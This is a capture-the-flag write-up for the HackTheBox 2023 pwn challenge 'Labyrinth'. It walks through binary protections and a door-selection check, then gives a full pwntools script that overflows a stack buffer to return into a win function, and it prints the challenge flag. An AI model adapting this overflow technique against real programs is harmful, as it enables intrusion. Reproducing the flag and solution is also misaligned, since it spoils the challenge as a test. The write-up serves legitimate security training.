---
name: Labyrinth (2023)
event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
category: Pwn
description: Writeup for Labyrinth (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Labyrinth

## Description

> You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.

## Solution

Check file info and binary protections.

{% code overflow="wrap" %}
```bash
file labyrinth
labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

{% code overflow="wrap" %}
```bash
checksec --file labyrinth
[*] '/home/crystal/Desktop/htb/challenge/labyrinth'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```
{% endcode %}

Decompile in ghidra and find we must select door `69` followed by door `069`. However, providing `069` is enough to satisfy both conditions.

In ghidra, we can find our offset of `64` and a "win" function called `escape_plan` which prints the flag.

{% code overflow="wrap" %}
```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
break *0x401602
continue
'''.format(**locals())

# Binary filename
exe = './labyrinth'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Offset to RIP
offset = 64

# Start program
io = start()

ret = 0x401016

# Build the payload
payload = flat([
    b'C' * (offset - 8),
    ret,  # stack alignment
    elf.symbols.escape_plan
])

# Pass initial checks
io.sendlineafter(b'>', b'069')

# Send the payload
io.sendlineafter(b'>', payload)

# Got Flag?
io.recvuntil(b'journey:')
warn(io.recvlines(2)[1].decode())
```
{% endcode %}

Flag: `HTB{3sc4p3_fr0m_4b0v3}`
